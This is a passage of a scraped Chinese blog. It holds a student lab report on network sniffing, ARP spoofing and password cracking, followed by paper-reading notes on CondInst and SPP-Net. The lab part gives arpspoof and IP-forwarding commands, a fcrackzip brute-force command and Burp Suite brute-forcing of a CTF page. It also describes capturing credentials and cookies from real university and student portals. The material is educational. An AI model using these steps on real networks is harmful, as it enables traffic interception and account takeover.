如何使用SQLMAP利用网站的注入漏洞","categories":[{"name":"课程学习","slug":"课程学习","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"网络渗透测试","slug":"课程学习/网络渗透测试","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"课程学习","slug":"课程学习","permalink":"http://blog.keter.top/tags/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"网络渗透测试","slug":"网络渗透测试","permalink":"http://blog.keter.top/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"「白帽子学习笔记」网络嗅探与身份验证","slug":"【白帽子学习笔记】网络嗅探与身份验证","date":"2020-11-05T06:01:02.000Z","updated":"2021-08-17T09:04:04.000Z","comments":true,"path":"2020/11/05/【白帽子学习笔记】网络嗅探与身份验证/","link":"","permalink":"http://blog.keter.top/2020/11/05/%E3%80%90%E7%99%BD%E5%B8%BD%E5%AD%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2%E4%B8%8E%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/","excerpt":"@一个在写实验报告的人，/(ㄒoㄒ)/~~ ¶0x01 网络嗅探相关概念 ¶1x01 网络嗅探概述 Sniffer（嗅探器）工作在OSI模型的第二层，利用计算机的网卡截获网络数据报文的一种工具，可用来监听网络中的数据，分析网络的流量，以便找出所关心的网络中潜在的问题。例如,假设网络的某一段运行得不是很好,报文的发送比较慢,而我们又不知道问题出在什么地方,此时就可以用嗅探器确定不同网络协议、不同用户的通信流量，相互主机的报文传送间隔时间等，这些信息为管理员判断网络问题、管理网络区域提供了非常宝贵的信息。 在正常情况下，一个合法的网络接口应该只响应这样的两种数据帧： 帧的目标区域具有和本地网络接口相匹配的硬件地址； 帧的目标区域具有“广播地址”。","text":"@一个在写实验报告的人，/(ㄒoㄒ)/~~ ¶0x01 网络嗅探相关概念 ¶1x01 网络嗅探概述 Sniffer（嗅探器）工作在OSI模型的第二层，利用计算机的网卡截获网络数据报文的一种工具，可用来监听网络中的数据，分析网络的流量，以便找出所关心的网络中潜在的问题。例如,假设网络的某一段运行得不是很好,报文的发送比较慢,而我们又不知道问题出在什么地方,此时就可以用嗅探器确定不同网络协议、不同用户的通信流量，相互主机的报文传送间隔时间等，这些信息为管理员判断网络问题、管理网络区域提供了非常宝贵的信息。 在正常情况下，一个合法的网络接口应该只响应这样的两种数据帧： 帧的目标区域具有和本地网络接口相匹配的硬件地址； 帧的目标区域具有“广播地址”。 如果网卡处于混杂（promiscuous）模式，那么它就可以捕获网络上所有的数据帧，处于对网络的“监听”状态，如果一台机器被配置成这样的方式，它（包括其软件）就是一个嗅探器。 在交换型以太网中，上述条件2是不满足的。所有的主机连接到SWITCH，SWITCH比HUB更聪明，它知道每台计算机的MAC地址信息和与之相连的特定端口，发给某个主机的数据包会被SWITCH从特定的端口送出，而不是象HUB那样，广播给网络上所有的机器。这种传输形式使交换型以太网的性能大大提高，同时还有一个附加的作用：使传统的嗅探器无法工作。 交换型网络环境嗅探的核心问题是：如何使本不应到达的数据包到达本地。通常的方法有MAC洪水包和ARP欺骗。其中MAC洪水包是向交换机发送大量含有虚构MAC地址和IP地址的IP包，使交换机无法处理如此多的信息，致使交换机就进入了所谓的&quot;打开失效&quot;模式，也就是开始了类似于集线器的工作方式，向网络上所有的机器广播数据包。 ¶1x02 ARP欺骗 每一个主机都有一个ARP高速缓存，此缓存中记录了最近一段时间内其它IP地址与其MAC地址的对应关系。如果本机想与某台主机通信，则首先在ARP高速缓存中查找此台主机的IP和MAC信息，如果存在，则直接利用此MAC地址构造以太帧；如果不存在，则向本网络上每一个主机广播一个ARP请求报文，其意义是&quot;如果你有此IP地址，请告诉我你的MAC地址&quot;，目的主机收到此请求包后，发送一个ARP响应报文，本机收到此响应后，把相关信息记录在ARP高速缓存中，以下的步骤同上。 ARP报文格式： 可以看出，ARP协议是有缺点的，第三方主机可以构造一个ARP欺骗报文，而源主机却无法分辨真假。如果发送者硬件地址字段填入攻击者的硬件地址，而发送者IP地址填入被假冒者的IP地址，那么就构造出了一个用于欺骗的ARP请求报文。那么被欺骗主机的ARP高速缓存，被假冒者的IP地址与其MAC地址的对应关系就会更改为欺骗者的，从而达到ARP欺骗的目的。特别的，如果攻击者冒充网关，将转发子网内到外网的所有通信量，以达到捕获其他主机的通信量，从而破坏数据传输的保密性。 ¶1x03 密码安全 在现实网络中，攻击事件发生的频率越来越高，其中相当多的都是由于网站密码泄露的缘故，或是人为因素导致，或是口令遭到破解，所以从某种角度而言，密码的安全问题不仅仅是技术上的问题，更主要的是人的安全意识问题。 口令破解方法 口令破解主要有两种方法：字典破解和暴力破解。 字典破解是指通过破解者对管理员的了解，猜测其可能使用某些信息作为密码，例如其姓名、生日、电话号码等，同时结合对密码长度的猜测，利用工具来生成密码破解字典。如果相关信息设置准确，字典破解的成功率很高，并且其速度快，因此字典破解是密码破解的首选。 而暴力破解是指对密码可能使用的字符和长度进行设定后（例如限定为所有英文字母和所有数字，长度不超过8），对所有可能的密码组合逐个实验。随着可能字符和可能长度的增加，存在的密码组合数量也会变得非常庞大，因此暴力破解往往需要花费很长的时间，尤其是在密码长度大于10，并且包含各种字符（英文字母、数字和标点符号）的情况下。 口令破解方式 口令破解主要有两种方式：离线破解和在线破解。 离线破解攻击者得到目标主机存放密码的文件后，就可以脱离目标主机，在其他计算机上通过口令破解程序穷举各种可能的口令，如果计算出的新密码与密码文件存放的密码相同，则口令已被破解。 候选口令产生器 候选口令产生器的作用是不断生成可能的口令。有几种方法产生候选口令，一种是用枚举法来构造候选口令（暴力破解），另一种方法是从一个字典文件里读取候选口令（字典破解）。 口令加密 口令加密过程就是用加密算法对从口令候选器送来的候选口令进行加密运算而得到密码。这要求加密算法要采用和目标主机一致的加密算法。加密算法有很多种，通常与操作系统或应用程序的类型和版本相关。 Burp Suite是一个用于测试Web应用程序安全性的图形工具。该工具使用Java编写，由PortSwigger Security开发。该工具有两个版本。可免费下载的免费版（免费版）和试用期后可购买的完整版（专业版）。免费版本功能显着降低。它的开发旨在为Web应用程序安全检查提供全面的解决方案，Burp Suite是进行Web应用安全测试集成平台。它将各种安全工具无缝地融合在一起，以支持整个测试过程中，从最初的映射和应用程序的攻击面分析，到发现和利用安全漏洞。 ¶0x02 网络嗅探部分 ¶1x01 sinffer（Wireshark抓包） A主机上外网，B运行sinffer(Wireshark)选定只抓源为A的数据)。 我们选择Metasploit2主机作为A，Kali作为B。首先我们需要确认kali和Windows处于同一网段（可相互ping通的状态)。（PS：这一步是使用的Metasploit2，后面因为需要到网页里面提交数据就换成了win7） 接下来在kali中打开Wireshark，如果想要抓源只为A的数据，那么过滤语句为： ip.src == 10.34.80.4 接下来我们使用A去ping B观察一下wireshark的反应。 但是如果A ping的是百度，或者往某一个网址发送包含账号和密码的HTTP报文。就可以获取相应信息。 ¶1x02 ARP欺骗 关于ARP的原理已经攻击原理我在以前的一篇博客中有写到： 【白帽子学习笔记20】arp协议原理与攻击应用 为了欺骗B，让B把报文全部发到A这里来。A需要冒充局域网中交换机的角色。（此时B为Win7主机） 这一步我们需要使用一个工具就是arpspoof。在安装这个包的过程中可能会遇到一些坑。下面记录一下我遇到的一些问题。 建议更换kali源，否则有可能出现找不到的情况 安装过程使用sudo apt-get install dsniff而不是直接install arpspoof 这里我们使用单向攻击： 受攻击主机将数据发送到攻击主机，并由攻击主机转发至网关，网关将数据发送至服务器，服务器返回数据给网关，网关返回数据给受攻击主机 步骤如下： 开启端口转发，允许本机像路由器那样转发数据包 echo 1 &gt; /proc/sys/net/ipv4/ip_forward ARP投毒，向主机B声称自己(攻击者)就是网关 arpspoof -i eth0 -t IP1 IP2(IP1是我们的攻击目标、IP2是网关IP地址) 首先确认Win7的IP地址，然后确认网关地址。 接下来查询网关： wireshark抓包分析 我们使用Win7尝试访问一下百度。 接下来到wireshark里面看一下。修改wireshark的筛选规则为ip.src == 10.34.80.3。结果可以看到成功抓取到了数据！ 接下来我们选择一个网站输入以下账号密码。就选择大家&quot;最爱&quot;的X班吧. 我记得他的信息上传是没有加密的。 点击登陆； 之后在wireshark里查找发送到易班服务器的http post包。 但是最后发现某班的密码是加密发送的，所以账号密码信息还是不能获得。但是可以从包里面获取到cookie信息，这样再通过Chrome修改cookie的插件就可以完成免密登陆。 由于没有完成任务，我们切换到某大学的学生选课系统的登陆界面。 经过相同的操作之后抓到了包。 在数据报里面成功的发现我过程输入的账号和密码的明文信息。 ¶1x03 WireShark分析文件 1.如何发现有FTP服务器？且找到FTP服务器的IP地址？ 通过观察流量数据，可以发现有大量基于FTP协议传输的数据库，所以推测有FTP服务器。 通过对部分数据包的分析，比如如下两个： 可以知道192.168.182.1是FTP文件服务器。 2.客户端登陆FTP服务器的账号和密码分别是什么？ 通过这两个数据包可以确定服务器的账号和密码。 3.客户端从FTP下载或查看了2个文件，一个是zip文件，一个是txt文件，文件名分别是什么？ 在数据包中可以发现，用户分别查看了1.zip 和 复习题.txt 4.还原ZIP文件并打开 这里我们需要知道的一个知识是对FTP服务器的操作虽然是基于FTP协议解决的，但是真正在下载文件的时候还是使用tcp协议。所以需要zip数据包的时候需要在TCP数据包里面找，可以根据zip文件的文件头和文件尾快速的确认zip包的位置。 将原始数据另存为a.zip, 可以得到一个正常的压缩包，但是有密码。 我们使用kali下的fcrakzip密码破解工具，对zip进行破解。先sudo apt-get install fcrackzip安装 破解命令 fcrackzip -b -c1 -l 6 -u a.zip 接下来解释一下这个命令。 -b：使用暴力模式 -c1：使用纯数字进行破解 -l：规定破解密码长度/范围 -u：使用unzip 最后得到了我们的小企鹅。 5.TXT的内容是什么？ 通过追踪TXT信息，可以确定文件内容如下： 6. 网站密码破解部分： 为了合法的完成渗透测试报告，我们选择Bugku中一道需要运用到暴力破解的题目为例，解析一下如何运用Burp Suite爆破一个网站。 网站网址: http://123.206.87.240:8002/baopo/ 看到这个5位的密码，在检查源码和抓包之后都没有发现什么端倪，尝试bp一波 这里想尝试一下5位数字，5位字母需要的时间太长了. 使用BP自带的字典就可以满足我们的需求 这里可以根据Length的大小来判断时候爆破出密码，密码正确和密码错误的返回长度肯定是不一样的。 爆破成功啦！ ¶1x04 MD5破解 打开一个在线md5解密网站就可以解开简单的md5码。 ¶1x05 John the Ripper John the Ripper 是一款速度很快的密码破解工具，目前可用于 Unix、macOS、Windows、DOS、BeOS 与 OpenVMS 等多种操作系统。最初其主要目的是检测弱 Unix 密码，而现在，除了支持许多 Unix crypt(3) 密码哈希类型，John the Ripper “-jumbo”版本还支持数百种其它哈希类型和密码。 ¶0x03 做有所得 ¶1x01 如何防止ARP攻击 终端对网关的绑定要坚实可靠，这个绑定能够抵制被病毒捣毁。 接入路由器或网关要对下面终端IP-MAC的识别始终保证唯一准确。 网络内要有一个最可依赖的机构，提供对网关IP-MAC最强大的保护。它既能够分发正确的网关信息，又能够对出现的假网关信息立即封杀。 ¶1x02 安全的密码（口令）应遵守的原则 避免出现弱密码 记住的密码才是好密码 每个平台密码最好能够有一定的区别 ¶1x03 字典的重要性 在破解密码或密钥时，逐一尝试用户自定义词典中的可能密码（单词或短语）的攻击方式。与暴力破解的区别是，暴力破解会逐一尝试所有可能的组合密码，而字典式攻击会使用一个预先定义好的单词列表（可能的密码）。对于暴力破解社会工程学是经常用到的方法。根据社会工程学生成的字典可以极大的增大密码破译的成功率。 ¶1x04 小结 通过本次的实验我们学习到了以下内容： 什么是网络嗅探 ARP协议原理 FTP协议 如何使用WireShark抓包并对数据包进行分析 MD5加密方式 如何使用密码字典爆破数据 密码安全 通过这次的实验我对网络嗅探有了比较充分的了解，对网络中的协议如ARP，FTP等又有了更深的了解。可以更加熟练的使用WireShark, 了解了暴力破解网站和压缩文件的基本操作。以及对于密码安全防护的意识加强。收益良多","categories":[{"name":"课程学习","slug":"课程学习","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"网络渗透测试","slug":"课程学习/网络渗透测试","permalink":"http://blog.keter.top/categories/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"课程学习","slug":"课程学习","permalink":"http://blog.keter.top/tags/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/"},{"name":"网络渗透测试","slug":"网络渗透测试","permalink":"http://blog.keter.top/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"「论文阅读」Conditional-Convolutions-for-InstanceSegmentation","slug":"【论文阅读】Conditional-Convolutions-for-InstanceSegmentation","date":"2020-10-30T06:01:02.000Z","updated":"2021-08-13T13:38:41.000Z","comments":true,"path":"2020/10/30/【论文阅读】Conditional-Convolutions-for-InstanceSegmentation/","link":"","permalink":"http://blog.keter.top/2020/10/30/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91Conditional-Convolutions-for-InstanceSegmentation/","excerpt":"¶0x01 概要 Mask R-CNN等性能最好的实例分割方法依赖于ROI操作（通常是ROIPool或roalign）来获得最终的实例掩码。相比之下，我们建议从一个新的角度来解决站姿分割问题。我们不使用实例级roi作为固定权重网络的输入，而是使用基于实例的动态感知网络。CondInst有两个优点：1）通过完全卷积网络。","text":"¶0x01 概要 Mask R-CNN等性能最好的实例分割方法依赖于ROI操作（通常是ROIPool或roalign）来获得最终的实例掩码。相比之下，我们建议从一个新的角度来解决站姿分割问题。我们不使用实例级roi作为固定权重网络的输入，而是使用基于实例的动态感知网络。CondInst有两个优点：1）通过完全卷积网络。 CondInst有两个优点： 1）通过完全卷积网络解决实例分割，消除了ROI裁剪和特征对齐的需要； 2）由于动态生成条件卷积的能力大大提高，掩模头可以非常紧凑（例如，3转换层，每个只有8个通道），导致明显更快的推断。 ¶0x02 Mask-RCNN的缺点 实例分割是计算机视觉中的一项基本而又具有挑战性的任务，它需要一种算法来预测图像中每个感兴趣的实例的每像素掩模。尽管最近提出了一些工作，但实例分割的主流框架仍然是两阶段方法Mask R-CNN，它将实例分割转化为两阶段的检测和分割任务。Mask R-CNN首先使用一个更快的对象检测器R-CNN来预测每个实例的边界框。然后在每个实例中，使用roiallign操作从网络的特征图中裁剪出感兴趣的区域（roi）。为了预测每个实例的最终掩模，将一个紧凑的全卷积网络（FCN）（即掩模头）应用到这些roi上，以执行前景/背景分割。 1） 由于ROI通常是轴对齐的边界框，对于形状不规则的对象，它们可能包含大量不相关的图像内容，包括背景和其他实例。这个使用旋转roi可以缓解这个问题，但代价是更复杂的管道。 2） 为了区分前景实例和背景内容或实例，掩码头需要一个相对较大的接受域来编码足够大的上下文信息。因此，在掩模头中需要一组3×3的卷积（例如，掩模R-CNN中有4个3×3卷积，256个通道）。它大大增加了掩模头的计算复杂度，导致推理时间在实例数上有显著变化。 3） ROI的大小通常不同。为了在现代深度学习框架中使用有效的批处理计算，通常需要调整大小操作来将裁剪区域调整为相同大小的补丁。例如，Mask R-CNN会将所有裁剪区域的大小调整为14×14（使用反褶积将采样率提高到28×28），这限制了实例分段的输出分辨率，因为大型实例需要更高的分辨率来保留边界的细节 ¶0x03 为什么FCNs在实例分割上的效果不好 我们发现，将模糊神经网络应用于实例分割的主要困难在于相似图像的出现可能需要不同的预测，但FCNs难以实现这一点。例如，如果在一个input image中有两个外观相似的人A和B，那么在预测A的实例掩码时，FCN需要将B预测为background w.r.t.A，这可能很困难，因为它们在外观。因此，ROI操作用于裁剪感兴趣的人，即A；并过滤掉B，实例分段需要两种类型的in队形： 1） 用于对对象进行分类的外观信息； 2）用于区分属于同一类别的多个对象的位置信息。几乎所有的方法都依赖于ROI裁剪，对实例的位置信息进行显式编码。相比之下，CondInst通过使用敏感卷积滤波器以及显示在特征地图上的相对坐标来利用位置信息。 因此，我们提倡一种新的解决方案，即使用实例感知FCNs进行实例任务预测。换言之，与使用一组固定卷积滤波器的标准ConvNet作为掩码头来预测所有实例，而是根据要预测的实例来调整网络参数。在动态过滤网络[20]和CondConv[41]的启发下，对于每个实例，控制器子网络（见图3）动态生成掩码FCN网络参数（以实例的中心区域为条件），然后使用该参数预测该实例的掩码。预计网络参数可以对该实例的特征（例如相对位置、形状和外观）进行编码，并且只对该实例的像素进行激发，从而绕过了上述困难。这些条件掩模头被应用到整个特征映射中，消除了对ROI操作的需要。乍一看，这个想法可能行不通，因为如果某些图像包含多达几十个实例，则实例掩码头可能会产生大量的网络参数。然而，我们发现，一个非常紧凑的FCN掩模头和动态生成的滤波器已经可以优于先前基于ROI的mask R-CNN，从而大大降低了Mask-CNN中掩模头的每一瞬间的计算复杂度。 ¶0x04 主要贡献 试图从一个新的角度来解决实例分割问题。为此，我们提出了CondInst实例分割框架，该框架比现有的Mask R-CNN等方法在提高实例分割速度的同时，提高了实例分割的性能。据我们所知，这是第一次一个新的实例分割框架在精确度和速度上都优于最新的技术 CondInst是完全卷积的，并且避免了许多现有方法中使用的上述调整大小操作，因为CondInst不依赖ROI。不必调整特征图的大小，就可以获得高分辨率的分辨率，并具有更精确的边缘。 与以前的方法不同，一旦训练完所有实例，掩码头中的过滤器都是固定的，而我们的掩码头中的过滤器是动态生成的，并根据实例进行调整。因此，只需记住一个过滤器，就可以大大减少所要求的过滤器的负载。因此，Mask head 可以非常轻量，显著减少推理时间。与bounding box检测器FCOS相比，CondInst只需要多10%的计算时间，甚至可以处理每个图像的最大实例数（即100个实例）。 ¶0x05 CondInst的实例分割 ¶1x01 网络总体结构 回想一下mask R-CNN使用一个对象检测器来预测输入图像中实例的边界框。边界框实际上就是掩码R-CNN表示实例的方式。类似地，CondInst使用实例感知过滤器来表示实例。换句话说，CondInst没有将实例概念编码到边界框中，而是隐式地将其编码到掩码头的参数中，这是一种更灵活的方式。例如，它可以很容易地表示不规则的形状，而这些不规则形状是很难被表示的,）被边界框紧紧包围。这是CondInst相对于以前基于ROI的方法的优势之一。 与基于ROI的方法获取边界框的方式类似，实例感知滤波器也可以通过对象检测器获得。在这项工作中，由于CondInst的简单性和灵活性，CondInst在流行的目标检测器FCOS上构建CondInst。同时，在FCOS中消除锚盒也可以节省参数的数目和条件的计算量。如图 利用特征金字塔网络的特征映射{P3、P4、P5、P6、P7}，其下采样率分别为8、16、32、64和128。如图3所示，在FPN的每个特征层上，应用一些功能层（在虚线框中）来进行实例相关的预测。例如，目标实例的类和实例的动态生成的筛选器。从这个意义上讲，CondInst可以看作是Mask R-CNN，它们都是先处理图像中的实例，然后预测实例的像素级掩码（即实例优先），除了检测器，如图所示，还有一个掩模分支，它提供了我们生成的掩码头作为输入来预测所需实例掩码的特征映射。 特征图表示为： 掩模分支连接到FPN level p3，因此其输出分辨率为输入图像分辨率的18。掩模分支在最后一层之前有四个3×3的卷积，有128个通道。之后，为了减少生成参数的数量，掩码分支的最后一层将信道数从128减少到8（即，Cmask＝8）。令人惊讶的是，使用cmask=8已经可以获得优异的性能，而使用更大的cmask（例如16）并不能提高性能，如我们的实验所示。更严重的是，使用cmask=2只会使mask AP的性能降低0.3%。此外，如图3所示，fmaski与坐标图相结合，这些坐标是fmask上所有位置到位置（x，y）的相对坐标（即，生成遮罩头的滤波器的位置）。然后，将组合发送到掩码头以预测实例掩码。如我们的实验所示，相对坐标为预测实例掩模提供了强有力的线索。此外，单个sigmoid被用作掩模头的最终输出，因此掩模预测是类无关的。实例的类别由分类头与控制器并行预测。 原始掩模预测的分辨率与F mask的分辨率相同，后者是输入图像分辨率的八分之一。为了产生高分辨率的实例掩模，使用双线性上采样将maskprediction上采样到4，得到400×512掩模预测（如果输入图像大小为800×1024）。我们将在实验中证明上采样对CondInst的最终瞬间分段性能至关重要。需要注意的是，该掩模的分辨率比掩模R-CNN（如前所述仅为28×28）高得多。 ¶1x02 网络输出和训练标签 CondInst 具有如下的输出头： Classiofication Head： 分类头预测实例的分类，ground-truth标签为类别信息或者0（背景）即背景）。在FCOS中，网络预测一个C-D vector 用于分类，每个元素在对应于一个二进制分类器，其中C表示类别的数量。 Controller Head 控制器头与上述分类头具有相同的结构，用于预测该位置实例的Mask head的参数。Mask head 预测这个物体Mask。为了预测参数，我们将滤波器的所有参数（即权重和偏差）串联在一起作为一个N-D向量 ，其中N是参数的总数。因此，控制器头部没有输出信道。掩模头是一种非常紧凑的fcn结构，它有三个1×1的卷积，每个卷积有8个通道，除了最后一个外，都使用ReLU作为激活函数。这里没有使用诸如批处理规范化之类的规范化层。最后一层有1个输出信道，使用sigmoid来预测前景的概率。任务头总共有169个参数（#权重=（8+2）×8（conv1）+8×8（conv2）+8×1（conv3）和#biaes=8（conv1）+8（conv2）+1（conv3））。如前所述，生成的过滤器包含关于实例所在位置的信息，因此，理想情况下，带有过滤器的遮罩头将只对实例的像素点进行触发，甚至将整个特征映射作为输入。 Center-ness and Box Heads. 从概念上讲，CondInst可以消除box head，因为CondInst不需要ROIs。然而，我们发现如果使用基于Box的NMS，推理时间将大大减少。因此，我们仍然预测CondInst中的Box。我们要强调的是，预测框仅在NMS中使用，不涉及任何ROI操作。 ¶1x03 损失函数 ¶1x04 推理 给定一幅输入图像，通过网络进行转发，得到包含分类置信度的输出, 中心度得分，box预测 和生成的参数, 我们首先按照FCOS中的步骤来获得Box。然后，使用阈值为0.6的基于Box的NMS来消除重复检测，然后使用前100个框计算掩码。与FCOS不同，这些方框还与控制器生成的过滤器相关联。让我们假设在NMS之后还有K个box，因此我们有生成的K个过滤器组。这一组滤波器用于产生特定于实例的Mask-head。这些特定于实例的掩码头以FCNs的方式应用于与（即,的组合）来预测实例的掩码。由于任务头是一个非常紧凑的网络（3个1×1卷积，共有8个信道和169个参数），计算掩码的开销非常小。例如，即使有100次检测（即MS-COCO上每个图像的最大检测次数），掩模头上总共也只有不到5毫秒的时间，这只给基本检测器FCOS增加了10%的计算时间。相比之下，Mask R-CNN的Mask head有4个3×3的256个通道，参数大于2.3M，计算时间较长。 ¶0x06 小结 提出了一个新的更简单的实例分割框架Condinst。不同于以往的方法，如Mask R-CNN，它使用固定权重的任务头，CondInst将掩码头设置在实例上，并动态生成掩码头的过滤器。这不仅降低了掩模头的参数和计算复杂度，而且消除了ROI操作，从而形成了一个更快、更简单的实例分割框架。","categories":[{"name":"论文阅读","slug":"论文阅读","permalink":"http://blog.keter.top/categories/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"}],"tags":[{"name":"论文阅读","slug":"论文阅读","permalink":"http://blog.keter.top/tags/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"},{"name":"实例分割","slug":"实例分割","permalink":"http://blog.keter.top/tags/%E5%AE%9E%E4%BE%8B%E5%88%86%E5%89%B2/"}]},{"title":"「论文阅读」空间金字塔池化网络SPP-Net","slug":"【论文阅读】空间金字塔池化网络SPP-Net","date":"2020-10-29T06:01:02.000Z","updated":"2021-08-13T13:33:27.000Z","comments":true,"path":"2020/10/29/【论文阅读】空间金字塔池化网络SPP-Net/","link":"","permalink":"http://blog.keter.top/2020/10/29/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91%E7%A9%BA%E9%97%B4%E9%87%91%E5%AD%97%E5%A1%94%E6%B1%A0%E5%8C%96%E7%BD%91%E7%BB%9CSPP-Net/","excerpt":"@[toc] ¶0x01概要介绍 现有的深卷积神经网络（CNNs）需要一个固定大小（如224×224）的输入图像。这种要求是“人为的”，可能会降低对任意大小/比例的图像或子图像的识别精度。在这项工作中，我们为网络配备了另一种池策略“空间金字塔池”，以消除上述要求。这种新的网络结构称为SPP网，它可以生成一个固定长度的表示，而不考虑图像的大小/比例。金字塔池对对象变形也很健壮。有了这些优势，SPP网应该在总体上改进所有基于CNN的图像分类方法。","text":"@[toc] ¶0x01概要介绍 现有的深卷积神经网络（CNNs）需要一个固定大小（如224×224）的输入图像。这种要求是“人为的”，可能会降低对任意大小/比例的图像或子图像的识别精度。在这项工作中，我们为网络配备了另一种池策略“空间金字塔池”，以消除上述要求。这种新的网络结构称为SPP网，它可以生成一个固定长度的表示，而不考虑图像的大小/比例。金字塔池对对象变形也很健壮。有了这些优势，SPP网应该在总体上改进所有基于CNN的图像分类方法。 SPP-net使用单一的完整图像表示而不是精细的方法实现了最先进的分类结果-调音SPP网络的强大功能在目标检测中也很重要。利用SPP网络，我们只需计算一次来自整个图像的特征映射，然后将任意区域（子图像）的特征集合起来生成固定长度的表示，以训练检测器。该方法避免了重复计算卷积特征。在处理测试图像时，我们的方法比R-CNN方法快24-102倍 引出SPP-Net的原因： 在cnn的训练和测试中存在一个技术问题：目前流行的CNNs要求输入图像大小固定（如224×224），这既限制了输入的纵横比，也限制了输入的规模图像。什么时候对于任意大小的图像，当前的方法大多是将输入图像调整为固定大小，通过裁剪或通过翘曲，如图所示。但是裁剪区域可能不包含整个对象，而扭曲的内容可能会导致不需要的几何图形扭曲。识别由于内容丢失或失真，精度可能会受到影响。 为什么需要固定尺寸？ cnn主要由两部分组成：卷积层和随后的完全连接层。卷积层以滑动窗口方式操作，并输出表示激活的空间排列的特征图（图2）。事实上，旋转层不需要固定的图像大小，可以生成任何尺寸的特征图。另一方面，完全连接的层需要有固定大小/长度的定义输入。因此，固定大小约束仅来自完全连接层. 输入本文引入空间金字塔池（SPP）来取消网络固定规模约束 ¶0x02 SPP-Net 我添加了最后一个卷积层上的SPP层。spp层将特征集合起来，生成固定长度的输出，然后输入到完全连接的层（或其他分类器）。换句话说，我们在网络层次结构的高级阶段（在进化层和完全连接层之间）执行一些信息“聚合”，以避免在开始。图1（底部）通过引入SPP层显示了网络体系结构的变化。我们称之为新的网络结构spp-net SPP的优点 SPP对于深层CNN有几个显著的特性：1）SPP能够生成固定长度的输出，而不考虑输入大小，而以前的deepnetworks中使用的滑动窗口池[3]不能；2）SPP使用多级而滑动窗口池只使用单个窗口大小。多层池对物体变形具有很强的鲁棒性[15]；3）由于输入尺度的灵活性，在可变尺度下提取的SPPcan池特征。实验表明，这些因素都提高了深层网络的识别精度。 SPP-net不仅可以从任意大小的图像/窗口生成测试的表示，而且还允许我们在训练期间提供不同大小或比例的图像。使用可变大小的图像进行训练可以提高尺度不变性并减少过拟合。我们开发了一种简单的多尺寸采集方法。当我们接受一个网络输入的单一变量时，我们使用一个固定的网络大小来训练它。在每一个纪元中，我们用一个给定的输入大小训练网络，然后切换到另一个输入大小来进行下一步操作。实验表明，这种多尺度训练与传统的单尺度训练一样收敛，具有更好的测试精度。 与R-CNN对对比： R-CNN中的特征计算是非常耗时的，因为它反复地将深度卷积网络应用于每幅图像上数千个扭曲区域的原始像素。Spp-Net可以在整个图像上运行卷积层（不考虑窗口数），然后通过SPP网络在特征地图上提取特征。注意 在特征地图（而不是图像区域）上训练/运行探测器实际上是一个更流行的想法。 但SPP网络继承了CNN深层特征映射的强大功能，同时也继承了SPP在任意窗口大小下的灵活性，从而使SPP网络具有了卓越的精度和效率。在我们的实验中，基于SPP网络的系统（建立在CNN管道上）计算的特征比R-CNN快24-102倍，具有更好的或可比性准确。有SPP网络可以促进更深层和更大的各种网络. ¶0x03 网络结构 ¶1x01 卷积层和特征图 考虑一下流行的七层架构，前五层是卷积的，其中一些是池层。这些池层也可以被认为是“卷积的”，因为它们使用的是滑动窗口。 最后的两层是完全连接的，以N路softmax作为输出，其中N是类别的数目。 上面描述的深度网络需要一个fixedimage大小。然而，我们注意到，固定尺寸的要求仅仅是由于完全连接的层需要固定长度向量作为输入。另一方面，卷积层接受轨道尺寸的输入。卷积层使用滑动过滤器，其输出与输入的aspectratio大致相同。这些输出被称为特征映射[1]——它们不仅涉及到响应的强度，而且涉及到它们的空间位置。 将一些特征地图可视化。它们是由conv5layer的一些过滤器生成的。图2（c）显示了ImageNet数据集中这些过滤器的最强激活图像。我们看到过滤器可以被一些语义内容激活。例如，第55个滤波器（图2，左下角）最易被圆形激活；第66个滤波器（图2，右上角）最易被∧形激活；第118个滤波器（图2，右下角）最易被a∨激活-形状。这些输入图像中的形状（图2（a））激活相应位置的特征映射（图2中的箭头） 生成图2中的featuremaps，而不需要固定输入大小。这些由深卷积层生成的特征映射与传统方法中的特征映射相似[27]，[28]。在这些方法中，SIFT向量[29]或图像块[28]被密集地提取和编码，例如通过矢量量化、稀疏编码或费希尔核进行编码。这些编码的特征由特征映射组成，然后由词包（BoW）或空间金字塔集合。类似地，深卷积特征可以以类似的方式汇集在一起。 ¶1x02 空间金字塔池层 这样的向量可以通过单词包（BoW）方法生成，该方法将这些特征集合在一起。空间金字塔池[14]，[15]改进了BoW，因为它可以通过在局部空间容器中的池来保持空间信息。这些空间存储单元的大小与图像大小成比例，因此无论图像大小，存储单元的数量都是固定的。这与以前的深层网络的滑动窗口池[3]不同，其中滑动窗口的数量取决于输入大小。到对于任意大小的图像采用深网络，我们将最后一个池层（例如，在最后一个卷积层之后的pool5）替换为aspatialpyramd池层。图3说明了方法。输入每一个空间单元，我们将每个滤波器的响应集中起来（在本文中我们使用最大池），空间金字塔池的输出是km维向量，其中格数表示为sm（kis是最后一个卷积层中的滤波器数）。固定维向量被输入到全连通层。 ¶0x04 训练网络 Spp-Net的训练过程分为两部 ¶1x01 单一尺度训练——single-size 所谓单一尺寸训练指的是先只对一种固定输入图像进行训练，比如224 x 224，在conv5之后的特征图为：13x13这就是我们的（a x a）而我要得到的输出为4 x 